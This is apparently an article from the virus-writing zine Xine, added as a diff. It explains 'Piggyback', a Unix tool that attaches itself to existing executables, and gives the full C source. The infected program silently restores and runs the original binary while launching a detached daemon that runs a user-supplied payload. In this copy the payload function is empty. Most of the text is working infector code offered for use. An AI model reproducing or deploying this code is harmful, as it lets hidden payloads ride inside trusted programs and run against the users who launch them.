@@ -1,0 +1,282 @@
+
+                                        /-----------------------------\
+                                        | Xine - issue #4 - Phile 110 |
+                                        \-----------------------------/
+
+              ***********       Piggyback     ***********
+							  
+							  
+  This is a small tool used to append executable code to an exiting
+program (virus writers would call it "to infect"). The idea used by
+piggyback is very simple and rather portable among different
+Unices. Piggyback itself is a small program in C that takes the place
+of the "victim", which is copied after the piggyback code.  At the
+real end is stored a long which is the lenght of the piggyback
+executable. You can see how does the file look like once "infected" on
+this nice ascii picture:
+						          
+       	       	     +---------+		          
+		     |         |			  
+		     |         |   	        	        
+		     ~ N bytes ~       	Piggyback code	  
+                     |         |		      	  
+		     |         |		      	  
+		     +---------+		      	  
+		     |         |		      	  
+		     |         |		      	  
+		     ~ M bytes ~	Victim code   	  
+		     |         |	    		  
+		     |         |	    		  
+		     +---------+	    		  
+		     | 4 bytes |	    		  
+		     | on 32   |	Piggyback len. = N
+		     | bits    |	             
+		     | arch.   |
+		     +---------+
+
+On execution the old file is copied to a temporany file and executed
+along with a payload code compiled in piggyback.
+
+  To use piggyback you just write the payload function and compile. If
+you don't want problems with shared libraries use the -static flag
+(under gcc). Then just do:
+
+./piggyback [name of executable to infect]
+
+  Let's have a close look at the inner working of piggyback. We
+analyze each function in turn.
+
+  payload: This is the payload code that you must write! :-)
+
+  find_fullname: The argument argv[0] passed to main contains the name
+of the executable, but it's not standard among different Unices. So
+this functions tries to transform ts input to an usable path.  It
+first check for an relative or absolute path (like "./run", "exe/run"
+or "/bin/run") or looks for the executable file in the directories
+listed in the PATH enviroment variable.
+
+  copy_file: This helper function just copies data from the second stream
+to the first.
+
+  restore: In this function the victim is restored to a temporany file.
+The steps taken are:
+1) we ask for a temporany file.
+2) look for the length of piggyback code.
+3) skip it and copy the victim code to the temporany file.
+4) take care of execution permission.
+
+  piggyback: Here we "infect" a given executable. We just mess with
+piggyback and victim code to achieve the structure presented in the
+picture.
+
+  main: A big if clearly shows that there are 2 use of this
+function. If we are called as piggyback, we just look for a parameter
+containing the victim name and do our job. Otherwise we restore the
+victim and fork 2 processes:
+1) One is the victim itself. Here we need anothe subprocess to clear 
+the temporany file when the victim is done.
+2) The payload, which is started as a daemon. Take a look at the
+Unix Programmes FAQ for an explanation of steps taken. The code
+before calling payload() assures that the payload won't be
+killed by HUP signals, won't block directories inodes,
+and closes it's standard descriptors. The double fork() is needed
+to prevent zombie processes.
+
+
+So, here it is. I hope you will find piggyback a useful tool!
+
+
+
+/* Piggyback by Kernel Panik 
+   
+   Compile with:
+   cc piggyback.c -o piggyback
+   strip piggyback
+
+   If you want a static executable just -static (for gcc).
+*/
+
+
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/wait.h>
+
+#include <string.h>
+#include <limits.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+
+#define BUF_SIZE 30000
+
+/* payload tha is started with old executable */
+void payload(void) {
+}
+
+/* this functions finds the fullname in from atgv[0], hopefully :-) */
+int find_fullname(char *full,char *partial) {
+  if (strchr(partial,'/')) {
+    if (partial[0]=='/') strcpy(full,"/");
+    else strcpy(full,"./");
+    strcat(full,partial);
+    return 1;
+  }
+  else {
+    char *next;
+    char *path=getenv("PATH");
+    char cp[PATH_MAX];
+    FILE *f;
+
+    do {
+      next=strchr(path,':');
+      if (next) {
+	strncpy(cp,path,next-path);
+	cp[next-path]='\0';
+	path=next+1;
+      }
+      else {
+	strcpy(cp,path);
+      }
+      strcat(cp,"/");
+      strcat(cp,partial);
+      if ((f=fopen(cp,"r"))) {
+	fclose(f);
+	strcpy(full,cp);
+	return 1;
+      }
+    } while (next);
+  }
+  return 0;
+}
+
+/* a simple function that copies file i to file o */
+void copy_file(FILE *o, FILE *i) {
+  char b[BUF_SIZE];
+  int l;
+
+  while ((l=fread(b,sizeof(char),BUF_SIZE,i))>0) {
+    fwrite(b,sizeof(char),l,o);
+  }
+}
+
+/* here we restore the exec we are rideing to a temp file */
+int restore(char *full, char *out) {
+  FILE *fin, *fout;
+  long offset;
+
+  tmpnam(out);
+  fout=fopen(out,"w");
+  fin=fopen(full,"r");
+  fseek(fin,-sizeof(long),SEEK_END);
+  fread(&offset,sizeof(long),1,fin);
+  fseek(fin,offset-1,SEEK_SET);
+  copy_file(fout,fin);
+  fclose(fin);
+  fclose(fout);
+  chmod(out,S_IRUSR|S_IWUSR|S_IXUSR);
+  return 1;
+}
+
+/* the real piggybacking code */
+int piggyback(char *fn, char *me) {
+  char tmp[PATH_MAX];
+  FILE *ffn, *ftmp, *fme;
+  long len;
+
+  tmpnam(tmp);
+  
+  if (!((ftmp=fopen(tmp,"w")) && (ffn=fopen(fn,"r")))) return 1;
+  copy_file(ftmp,ffn);
+  fclose(ftmp);
+  fclose(ffn);
+  if (!(ffn=fopen(fn,"w"))) {
+    remove(tmp);
+    return 2;
+  }
+  ftmp=fopen(tmp,"r");
+  fme=fopen(me,"r");
+  copy_file(ffn,fme);
+  copy_file(ffn,ftmp);
+  len=ftell(fme)+1;
+  fwrite(&len,sizeof(long),1,ffn);
+  fclose(ffn);
+  fclose(fme);
+  fclose(ftmp);
+  remove(tmp);
+  return 0;
+}
+
+int main (int argc, char *argv[]) {
+
+  char fullname[PATH_MAX];		/* our full name */
+  char outname[PATH_MAX];	/* program to be started */
+  char **newarg, *name;
+  int fd,i,status;
+
+  if ((name=strrchr(argv[0],'/'))) name++;
+  else name=argv[0];
+
+  if (!strcmp(name,"piggyback")) {
+    /* we are not already piggybacked*/
+
+    if (argc!=2) {
+      printf("Syntax: %s [filename]\n",argv[0]);
+      exit(3);
+    }
+
+    if (!find_fullname(fullname,argv[0])) {
+      printf("Cannot find myself: %s\n",argv[0]);
+      exit(5);
+    }
+
+    if (piggyback(argv[1],fullname)>0) {
+      printf("Syntax: Cannot piggyback %s:\n%s\n",argv[1],strerror(errno));
+      exit(4);
+    }      
+  }
+  else {
+    /* this is piggybacked code! */
+
+    if (!find_fullname(fullname,argv[0])) {
+      exit(1);
+    }
+    if (!restore(fullname,outname)) {
+      exit(2);
+    }
+
+    /* our payload will run like a daemon */
+    if (fork()==0) {
+      setsid();
+      if(fork()==0) {
+	chdir("/");
+	umask(0);
+	close(0);close(1);close(2);
+	fd=open("/dev/null",O_RDWR);
+	fd=open("/dev/null",O_RDWR);
+	fd=open("/dev/null",O_RDWR);
+	payload();
+	exit(0);
+      }
+      else exit(0);
+    }
+    wait(&status);
+
+    newarg=malloc(sizeof(char*)*(argc+1));
+    for(i=0;i<argc;i++) newarg[i]=argv[i];
+    if (!fork()) 
+      execvp(outname,newarg);
+    else {
+      /* wait for exit status and remove temp file */
+      wait(&status);
+      remove(outname);
+      return WEXITSTATUS(status);
+    }
+  }
+  
+  return 0;
+}
+
+
+
